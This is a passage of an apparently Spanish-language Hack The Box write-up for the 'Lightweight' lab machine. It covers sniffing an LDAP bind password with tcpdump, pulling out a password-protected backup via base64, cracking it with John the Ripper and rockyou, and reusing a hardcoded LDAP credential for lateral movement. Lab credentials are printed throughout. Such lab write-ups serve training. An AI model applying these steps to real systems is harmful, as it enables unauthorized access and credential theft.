    lightweight.htb.ldap > lightweight.htb.37972: Flags [F.], cksum 0x2928 (incorrect -> 0x0b27), seq 15, ack 100, win 683, options [nop,nop,TS val 11635014 ecr 11635012], length 0
	0x0000:  0000 0304 0006 0000 0000 0000 0000 0800  ................
	0x0010:  4500 0034 1af8 4000 4006 f6ca 0a0a 0a77  E..4..@.@......w
	0x0020:  0a0a 0a77 0185 9454 c131 93ec f581 4b82  ...w...T.1....K.
	0x0030:  8011 02ab 2928 0000 0101 080a 00b1 8946  ....)(.........F
	0x0040:  00b1 8944 0000 0000 0103 0307 0103 042d  ...D...........-
	0x0050:  7569 643d                                uid=
00:07:08.003406 IP (tos 0x0, ttl 64, id 49724, offset 0, flags [DF], proto TCP (6), length 52)
    lightweight.htb.37972 > lightweight.htb.ldap: Flags [.], cksum 0x2928 (incorrect -> 0x0b25), seq 100, ack 16, win 683, options [nop,nop,TS val 11635014 ecr 11635014], length 0
	0x0000:  0000 0304 0006 0000 0000 0000 0000 0800  ................
	0x0010:  4500 0034 c23c 4000 4006 4f86 0a0a 0a77  E..4.<@.@.O....w
	0x0020:  0a0a 0a77 9454 0185 f581 4b82 c131 93ed  ...w.T....K..1..
	0x0030:  8010 02ab 2928 0000 0101 080a 00b1 8946  ....)(.........F
	0x0040:  00b1 8946 3059 0201 0160 5402 0103 042d  ...F0Y...`T....-
	0x0050:  7569 643d                                uid=
```

> ldapuser2 : 8bc8251332abe1d7f105d3e53ad39ac2

Lo que logramos capturar fue bind login de LDAP. Al inicio creí que le había enviado un hash a la aplicación y perdí un buen rato tratando de romper el hash. Al final me di cuenta que como va a enviar un hash si se trata de ldap local... pero bueno, trate de hacer loggearme vía `su -` y funciono como era esperado:

```text
[10.10.14.36@lightweight ~]$ su - ldapuser2
Contraseña:
Último inicio de sesión:vie nov 16 22:41:31 GMT 2018en pts/0
[ldapuser2@lightweight ~]$ ls -lah
total 1.9M
drwx------.  4 ldapuser2 ldapuser2  197 Jun 21  2018 .
drwxr-xr-x. 12 root      root       195 May 19 05:24 ..
-rw-r--r--.  1 root      root      3.4K Jun 14  2018 backup.7z
-rw-------.  1 ldapuser2 ldapuser2    0 Jun 21  2018 .bash_history
-rw-r--r--.  1 ldapuser2 ldapuser2   18 Apr 11  2018 .bash_logout
-rw-r--r--.  1 ldapuser2 ldapuser2  193 Apr 11  2018 .bash_profile
-rw-r--r--.  1 ldapuser2 ldapuser2  246 Jun 15  2018 .bashrc
drwxrwxr-x.  3 ldapuser2 ldapuser2   18 Jun 11  2018 .cache
drwxrwxr-x.  3 ldapuser2 ldapuser2   18 Jun 11  2018 .config
-rw-rw-r--.  1 ldapuser2 ldapuser2 1.5M Jun 13  2018 OpenLDAP-Admin-Guide.pdf
-rw-rw-r--.  1 ldapuser2 ldapuser2 372K Jun 13  2018 OpenLdap.pdf
-rw-r--r--.  1 root      root        33 Jun 15  2018 user.txt
[ldapuser2@lightweight ~]$
```

Vientos, ya hemos ingresado como ldapuser2.

# cat user.text

Esta ya se la saben, solo hagan `cat user.txt`.

# From ldapuser2 to ... ?

Una vez que entremos como ldapuser2, veremos que hay un archivo muy sospechoso llamada _backup.7z_. Analicemos fuera de la maquina este archivo. Para ello y para mi gusto, exportare el archivo via base64:

```text
[ldapuser2@lightweight ~]$ file backup.7z
backup.7z: 7-zip archive data, version 0.4
[ldapuser2@lightweight ~]$ base64 backup.7z
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
```

Este machote de b64, lo grabamos como `backup.7z.b64` y lo reencodeamos localmente:

```text
xbytemx@laptop:~/htb/lightweight$ cat backup.7z.b64 | base64 -d > backup2.7z
```

Como era de esperarse, el archivo `backup.7z` tiene password. Pero no hay problema, yo tengo un amigo que sabe romper contraseñas, se llama john:

```text
xbytemx@laptop:~/htb/lightweight$ ~/git/JohnTheRipper/run/7z2john.pl backup2.7z | tee 7z.hash
backup2.7z:$7z$2$19$0$$8$11e96ba400e3926d0000000000000000$1800843918$3152$3140$1ed4a64a2e9a8bc76c59d8160d3bc3bbfd995ce02cf430ea41949ff4d745f6bf3ed238e9f06e98da3446dda53df0abf11902852e4b2a4e32e0b0f12b33af40d351b2140d6266db1a3d66e1c82fa9d516556ec893ba6841f052618ad210593b9975307b98db7e853e3ebfbef6856039647a6ad33a63f5b268fc003c39eba04484beff73264ff8c8fdb8e3bcc94ee0df4feacbba388536663f8feb8b1454890752fba4a7fba484cfd6d1d050aa6233478a2c425566d60630d985d15dae09c7485f92ea271d2087ac837b6f9101465cf4a62b0ee225245871655b1aa16526a2a5d61ab942d1418900fec9da5771da34cb8bf56ec7f05a75cf26a0202a7065b8b020769d244d95e3166fdb9f4557324e090307e91bc7adc7f56f5215ffd1463c7403c5725cbf006b46882439d629a14d4a1e25fafb202a1cfbac837eabf002f7ebfc87f20c67ff847c393a54e5724c29840016fa76be0dfbb73a79fb2ec3f0e9c7b246525acad50d76c3fe31d75004e5bc3e93ce79aab2ddbc91c7ce9666503e3ab8dcaf269d4554baee5276c516d23fabf41610ff4f666ad5cf9dc6dc3bed7e1c0a2767f018ca3cd15a35a1fbefce479b649a5db00263b55c470fcb049327e7aeb849359a74a2444de7a3c025b3a9dbfd597e0cdf642c340982b650d69f2c48b1e6b823b460734f3c6f3c1e3917b6780b0efda60ce5b7d03d55ff1fa0a161b9aa876b7498c8104f28ca6c6c629d6ca47c18e54bb237b62bd813d1cd47fdcd87b9597ddf14aec439185f8b892dedb4bcae949dbab74d72cd45dda311e0f38f219a1887bede5ec6697a8ab9f5cec687e18fd6ef2223015a3d717830f0aff0664e66ed51d185e965b55ce702135eb57f5efca251238f8e66f828c3d28d961dd09f244e735419273700e5ce97b4fa9ee3d5b45f8b81c9d5af1436e70f75dc9657354807bcadcdcf1e4f9432b29d55c21b59de59c933d0d96b0f3b89f871c14691faa63db3bdde5ca78f2c470839d49690d82f5c8334d9a857af449b1cd4c140b1087f41d09fb46baf5f0e7228716f992635e99861621d0e99d9d649ad863d99adab4ba060ef19b18a3dc2c64815401867c852ea17b01a5c551249cef2a234a1d0a91be047e06678a35ebe7256cca9791590bbfc37ee200d173f1c87a585003920ff52fc38f74da83c18284dbf171eda45fb0cba8d3ed09fc9d9e951ff95ae8b3326ec4d2cf6eaaca2890464a424f79718f044b6b7903c0f512744332f615f81e7a965df81f78ae950b98df910660b4c85bbee5b6b9b4eb061868530d1dee292296ac18e0f3081048834129583b2a7fa88573039ec01657642450688464a2e9db9bf9483d105875a30d855fe6c657a81ce5242a2a99887bdc1c786b57916b03a0d3cdddec1a0a8f94e6d9926ebf534a5b28fc4a4e16956941a5eb8718dbca21d9464a4a970b77a5967483f1373c4dc04967b16164d9d9ef6824acfcb63e20913234712b7abbc82f562aea65ef39d2bef6608d887cd5ff67966967a568a3dc21f28ad393d2ab3ca85ff7b87eebd97f80d878e616121bb94020c6fb80f3780c41dba3b4c4c3fceeba9748f4d9a47d3454b491b95bafddefd04afc8b1922e4a87534539d391fb948b59fcc1f5072c0af3c29afbbec26e2dfd7fc6d4e3a19fdb37cd49342bc7ec7526b6594295b341fe6a1a2a5f399eadade6dcb84d87fd3b00a9b79ef6c11cc01f5958a43fbdd2602eb10b4ddaa327ac043ee01c470d3ed2519488e80183043f41968f32283577cb5615de2416fcb9a74b1ce282614f818bc5adef0cb1dd6eb98d74a8d8214ec2a361b246bad656b487e8dce40f4fef808ad818c06ef5a972e2614e51e6b040f491a92ff39d55408cf92ccc0f797f27d8c1f7c5004b5613a660b6f306ba447bb99bbe5a408d00eb2dd4127351097f204e9d277a5eb97330a3d3409c7e097a18639542b1c9efe35eda1b12c1346bc8816a0430f5668a38735567ba09580504de831bb639ab1de7d2afcf2e470cbded2960f3300aca88446ccf0fa27715666e4eb45fe5d6a7a46c414d61e5fbbfd384c53e8bac6805083164332c2bd79d05c4d10436377a35b8402e186efd8959131437840c7b010d7ce74423e08bea80639414dbd0c290ced5bb1adf597b7a76141cc15d3d3054bcc4e9df234be4187725576645e86e0cfb9b7769a8cdefbec5b08d4feda04e8fd437631e181ac89deec9c54105a32776a2cb8f068177aabc375359e5b38ae4eb8cebf0668f5d104a5c5929c890c7d1de0694063943b844cd8f274b6f6bcbe004b3fe54e52905200e5b024a02498a1f767758e910516c7c295a552802e47d699cdd98adea07bd4f53f745342b990067339b9a0a2ab0c6ea2c0210961b96c7c22b2daaa322de7fddc91527d118c45d4a2a08a2c37a85a7b665ab4ba625b983019085b32096c78ed8a760c83fbf6c5811b7b16681b0a61513686d6810c72d0f1c30b792b1948a478ad660a4036fcd5dbfc57b352a22a4ed27daf1f8455aa9d81a5b8b28287fea4342c14bd42cf3159c830d322d166958a6e233ca7b9dd2914fce1f2621f95998e83df69bee22f70ae086f242690631fcd33730bb2e5ad64fa7d0b7b93931957311eeaa9b45382d020e85856e456712da51a9c220226d2a177e758ea6b7631647cc8419d04fb6b5dab40a841ba9d5660a550ac817af679f3c1a266b9c657372988ab38cfb6971695c59b5454fdf7ca1170066b99c06c985fb8564eed4caade040ef9320d5198041a2bfc62b4b21eb080520628ed3c8c8a2ffd8e0073b24c2059815da86f1b682622e714124950ff26ad79bf31897331fc23cd075fb1f4822046273b0898bebc1ba23110d74ed459c0c0f12488f0b51310f59c9dae537cdda5a75d48a4ac544531fba92fd6dbaa018cb3cc69ee4b9859f3fa1e022d4850bfd995afa9d70273789084f5955a30df3cf7de7f45c2601fe1ee0adbc89dbbd1aa23badcdfcc9d95e2bfd6f102c92bd1fb9648f446a98ab16302049f6862a0da1c758d0f0a7763e9ac0cdda94bed47f98103f8e068cd12bc83bb9a2bd2be19593d64a2f1034cdad6fbee498488a5b37efebcfe667393cf91c1a4d00082ea8463d57e691a0fb3b2394090dab00bb00d27b418b0db0171da74b6d314b78d951ec5ec87eff81800a0f41bb5eb01d5d116183667e1762c4a1d19631c05a61e1be0f05e5188da27df1a0d8697119fbe29693d776ce50c7896a3bc52888ebdcec056a4d7e675af2ea8de25f52e0470e053dd6614b3548ad0cd282a76d397b7e2fedc98d975003bd29feebc53ee5b412088599ac203cb8b6be1f3a0414511391b3495d175b3dfda7990753255ff0f13eb86ce97b5c6925aa31868523c325548720179c69e0e8df8407f5e87f263acd024cc5c4f5a75ef7a6fc1a3b650257fca20aa00674f35a07dac72471bbb500152b51dfe1743b797ad61110aa76b9fe69c0a02506ba4a6fc0b4a202efb9d88dfba38e5b5352046022cc17b57bdb40153db6b97e2f344d2c4598c0d021044eeb01423f6f6ade5702e10b63782fedddbaeba1dd9f9725eb3f85584fce2319b24851d7ec3ba2c2774741683b383ec97aadb7c912d655b6e5b147c33bb1856623b8ca08f092c0677d56e1dde99aa31ab30a654c57828536a120b4e4835ca6c7b5a2243bddfb9a00750521c74654a281cb12c806437030cd577907a797dc63a3959d47b68119a32a229899be06b7979c14b2c98e75667b8c5d30f0dfedd9553ba894ad9acda62f7f607bb35c080c3a440108ac0ce45f1873c5873488f2901790b08cb4928932a1c479d89ded5f6ce9f16c297e9dcc33c6b882b26c53b7a4f2b390367e36e384c1eb9805c0471aad4f77496e8f4fd447448dd59536629a645d04956fc30bcc686718e8d4d7cfc9ecbef3745af038de55826d328b7bad4a2eb7a10faf09c0618fd90d1941e8e3274bcd6eb2d8bed430ebfe6e8682b60390d79161f3a349c73de552d40f7421e5c4b4de80feb3998eb4ce6ecaef9bd2768e8be6534cd12ac163e70d3ed23963801c04770610c91f1ffcf4cbdf2a733f51e6fd596c855c0b905822a3838a82ea2d0e51dd442c451d05c6aa1b0099883db543927c0cc4016e27bb1b17fe863ae0c18458edbccdd6b15f0b73c3dc8c672c1bbbd81f290e9bb5291192143945d58757f64eceebd88e467d48b54a25cee7ed75263a4bb5d5597b9b5b75b6c254f81871f18246d2d91f664a0f49c1f67940d792d225272e713259f3135e5c286e081b1e2331f9217de1c0c9109d7a898458be85a4c130ea6e8c0db4dc5dbf77da5045f7da647c66e5af5676bb15221d5152da551a9390fda92e3539fde7afbd04e2e710ef28b5d5e50f2fdac106c9a18ef02414fb466f50f52b6e88e336ffe4fa929d9548630f3d7fb7d50ea590b2e3bdc3a88cf9d7f6b30f07d28ddf28c15c5371eb$4218$03
```

Listo el paso 1, obtener el hash del archivo 7z. Paso 2, romperla:

```text
xbytemx@laptop:~/htb/lightweight$ ~/git/JohnTheRipper/run/john --wordlist=/home/xbytemx/wl/rockyou.txt 7z.hash
Warning: detected hash type "7z", but the string is also recognized as "7z-opencl"
Use the "--format=7z-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (7z, 7-Zip [SHA256 256/256 AVX2 8x AES])
Cost 1 (iteration count) is 524288 for all loaded hashes
Cost 2 (padding size) is 12 for all loaded hashes
Cost 3 (compression type) is 2 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
delete           (backup2.7z)
1g 0:00:01:09 DONE (2019-04-08 21:10) 0.01447g/s 30.10p/s 30.10c/s 30.10C/s slimshady..jonathan1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Asi que la pass es **delete**. Descomprimamos:

```text
xbytemx@laptop:~/htb/lightweight$ 7z x backup2.7z

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=es_MX.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Core(TM) i5-4200U CPU @ 1.60GHz (40651),ASM,AES-NI)

Scanning the drive for archives:
1 file, 3411 bytes (4 KiB)

Extracting archive: backup2.7z
--
Path = backup2.7z
Type = 7z
Physical Size = 3411
Headers Size = 259
Method = LZMA2:12k 7zAES
Solid = +
Blocks = 1


Enter password (will not be echoed):
Everything is Ok

Files: 5
Size:       10270
Compressed: 3411
```

Una vez que se descomprime de manera exitosa, veamos cual es el contenido que nos entrego backup:

```text
xbytemx@laptop:~/htb/lightweight$ 7z l -pdelete backup.7z
Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2018-06-13 13:48:41 ....A         4218         3152  index.php
2018-06-13 13:47:14 ....A         1764               info.php
2018-06-10 10:08:57 ....A          360               reset.php
2018-06-14 14:06:33 ....A         2400               status.php
2018-06-13 13:47:46 ....A         1528               user.php
------------------- ----- ------------ ------------  ------------------------
2018-06-14 14:06:33              10270         3152  5 files
```

Perfecto, ahora podemos cerrar interrogantes al analizar el código de cada archivo.

1. index.php: No tiene nada especial que hayamos visto antes.
2. info.php:

```php
<?php $ip=$_SERVER['REMOTE_ADDR'];?>
```
3. reset.php:

```php
<?
$ip = $_SERVER['REMOTE_ADDR'];
file_put_contents("/var/www/html/reset_req", $ip.PHP_EOL, FILE_APPEND | LOCK_EX);
?>
```

4. status.php:

```php
<?php
$username = 'ldapuser1';
$password = 'f3ca9d298a553da117442deeb6fa932d';
$ldapconfig['host'] = 'lightweight.htb';
$ldapconfig['port'] = '389';
$ldapconfig['basedn'] = 'dc=lightweight,dc=htb';
//$ldapconfig['usersdn'] = 'cn=users';
$ds=ldap_connect($ldapconfig['host'], $ldapconfig['port']);
ldap_set_option($ds, LDAP_OPT_PROTOCOL_VERSION, 3);
ldap_set_option($ds, LDAP_OPT_REFERRALS, 0);
ldap_set_option($ds, LDAP_OPT_NETWORK_TIMEOUT, 10);

$dn="uid=ldapuser1,ou=People,dc=lightweight,dc=htb";

if ($bind=ldap_bind($ds, $dn, $password)) {
  echo("<p><i>You may or may not see this page when you are banned. </i><br><br>");
} else {
  echo("Unable to bind to server.</br>");
  echo("msg:'".ldap_error($ds)."'</br>".ldap_errno($ds)."");
  if ($bind=ldap_bind($ds)) {
    $filter = "(cn=*)";
    if (!($search=@ldap_search($ds, $ldapconfig['basedn'], $filter))) {
      echo("Unable to search ldap server<br>");
      echo("msg:'".ldap_error($ds)."'</br>");
    } else {
      $number_returned = ldap_count_entries($ds,$search);
      $info = ldap_get_entries($ds, $search);
      echo "The number of entries returned is ". $number_returned."<p>";
      for ($i=0; $i<$info["count"]; $i++) {
        var_dump($info[$i]);
      }
    }
  } else {
    echo("Unable to bind anonymously<br>");
    echo("msg:".ldap_error($ds)."<br>");
  }
}
?>
```

5. user.php: Nada realmente nuevo.


Nos quedamos con lo que nos entrega status (motivo por el cual tardaba en cargar):

```text
$username = 'ldapuser1';
$password = 'f3ca9d298a553da117442deeb6fa932d';
$ldapconfig['host'] = 'lightweight.htb';
$ldapconfig['port'] = '389';
$ldapconfig['basedn'] = 'dc=lightweight,dc=htb';
```

Si recordamos, esto no es un hash y es una contraseña ya que se usa sobre ldap con bind auth. Probemos nuestras nuevas credenciales:

```text
[10.10.14.151@lightweight ~]$ su - ldapuser1
Contraseña:
Último inicio de sesión:mar abr  9 03:10:38 BST 2019en pts/3
[ldapuser1@lightweight ~]$
```

Perfecto, ya tenemos las dos cuentas principales de home.

> ldapuser1 / f3ca9d298a553da117442deeb6fa932d

# From ldapuser1 to ???

Ahora que veamos que nos deja ldapuser1:

```text
[ldapuser1@lightweight ~]$ ls -lah
total 1.6M
drwx------.  5 ldapuser1 ldapuser1  239 Apr  9 02:06 .
drwxr-xr-x. 34 root      root      4.0K Apr  9 03:06 ..
-rw-------.  1 ldapuser1 ldapuser1    0 Jun 21  2018 .bash_history
-rw-r--r--.  1 ldapuser1 ldapuser1   18 Apr 11  2018 .bash_logout
-rw-r--r--.  1 ldapuser1 ldapuser1  193 Apr 11  2018 .bash_profile
-rw-r--r--.  1 ldapuser1 ldapuser1  246 Jun 15  2018 .bashrc
drwxrwxr-x.  3 ldapuser1 ldapuser1   18 Apr  8 21:06 .cache
-rw-rw-r--.  1 ldapuser1 ldapuser1 9.5K Jun 15  2018 capture.pcap
drwxrwxr-x.  3 ldapuser1 ldapuser1   18 Apr  8 21:22 .config
-rw-rw-r--.  1 ldapuser1 ldapuser1  646 Jun 15  2018 ldapTLS.php
-rwxrwxr-x.  1 ldapuser1 ldapuser1  45K Apr  7 18:35 LinEnum.sh
-rwxr-xr-x.  1 ldapuser1 ldapuser1 543K Jun 13  2018 openssl
drwxrw----.  3 ldapuser1 ldapuser1   19 Apr  8 23:26 .pki
-rw-------.  1 ldapuser1 ldapuser1 1.0K Apr  9 01:42 .rnd
-rwxr-xr-x.  1 ldapuser1 ldapuser1 921K Jun 13  2018 tcpdump
-rw-------.  1 ldapuser1 ldapuser1  691 Apr  9 02:05 .viminfo
```

Ese archivo capture.pcap suena muy sospechoso, mas por como entramos de unpriv ip user a ldapuser2. Respaldemos los archivos:

```text
[ldapuser1@lightweight ~]$ base64 capture.pcap
1MOyoQIABAAAAAAAAAAAAP//AAABAAAAeAskWwvrBgBeAAAAXgAAAAAAAAAAAAAAAAAAAIbdYAAA
AAAoBkD+gAAAAAAAAHkKHJo9Yd5E/oAAAAAAAAB5ChyaPWHeRNSkAYUy6e1iAAAAAKACqqpfxQAA
AgT/xAQCCAoBRjVyAAAAAAEDAwZ4CyRbk+sGAF4AAABeAAAAAAAAAAAAAAAAAAAAht1gAAAAACgG
QP6AAAAAAAAAeQocmj1h3kT+gAAAAAAAAHkKHJo9Yd5EAYXUpEfElRYy6e1joBKqql/FAAACBP/E
BAIICgFGNXIBRjVyAQMDBngLJFvM6wYAVgAAAFYAAAAAAAAAAAAAAAAAAACG3WAAAAAAIAZA/oAA
AAAAAAB5ChyaPWHeRP6AAAAAAAAAeQocmj1h3kTUpAGFMuntY0fElReAEAKrX70AAAEBCAoBRjVy
AUY1cngLJFuf7AYAsQAAALEAAAAAAAAAAAAAAAAAAACG3WAAAAAAewZA/oAAAAAAAAB5ChyaPWHe
RP6AAAAAAAAAeQocmj1h3kTUpAGFMuntY0fElReAGAKrYBgAAAEBCAoBRjVyAUY1cjBZAgEBYFQC
AQMELXVpZD1sZGFwdXNlcjIsb3U9UGVvcGxlLGRjPWxpZ2h0d2VpZ2h0LGRjPWh0YoAgOGJjODI1
MTMzMmFiZTFkN2YxMDVkM2U1M2FkMzlhYzJ4CyRbsuwGAFYAAABWAAAAAAAAAAAAAAAAAAAAht1g
AAAAACAGQP6AAAAAAAAAeQocmj1h3kT+gAAAAAAAAHkKHJo9Yd5EAYXUpEfElRcy6e2+gBACq1+9
AAABAQgKAUY1cgFGNXJ4CyRbMmwHAGQAAABkAAAAAAAAAAAAAAAAAAAAht1gAAAAAC4GQP6AAAAA
AAAAeQocmj1h3kT+gAAAAAAAAHkKHJo9Yd5EAYXUpEfElRcy6e2+gBgCq1/LAAABAQgKAUY1kwFG
NXIwDAIBAWEHCgEABAAEAHgLJFtnbAcAVgAAAFYAAAAAAAAAAAAAAAAAAACG3WAAAAAAIAZA/oAA
AAAAAAB5ChyaPWHeRP6AAAAAAAAAeQocmj1h3kTUpAGFMuntvkfElSWAEAKrX70AAAEBCAoBRjWT
AUY1k3gLJFuBgwcAXQAAAF0AAAAAAAAAAAAAAAAAAACG3WAAAAAAJwZA/oAAAAAAAAB5ChyaPWHe
RP6AAAAAAAAAeQocmj1h3kTUpAGFMuntvkfElSWAGAKrX8QAAAEBCAoBRjWTAUY1kzAFAgECQgB4
